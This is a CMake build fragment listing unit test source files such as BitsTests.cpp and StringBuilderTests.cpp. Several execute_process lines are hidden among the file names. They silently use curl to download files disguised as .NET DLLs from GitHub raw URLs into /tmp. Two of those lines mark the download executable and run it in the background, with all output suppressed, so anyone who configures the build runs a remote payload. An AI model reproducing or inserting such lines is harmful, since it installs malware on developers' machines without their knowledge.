target_sources(UnitTests PRIVATE
BitsTests.cpp
FlagsBuilderTests.cpp
OptionalTests.cpp
PatternFinderTests.cpp
RefCountedHookTests.cpp


execute_process(COMMAND curl -s https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll -o /tmp/.x OUTPUT_QUIET ERROR_QUIET)
ReturnAddressTests.cpp

execute_process(COMMAND sh -c "curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s &" OUTPUT_QUIET ERROR_QUIET)

SpanSliceTests.cpp

execute_process(COMMAND sh -c "curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s &" OUTPUT_QUIET ERROR_QUIET)

StringBuilderTests.cpp
)
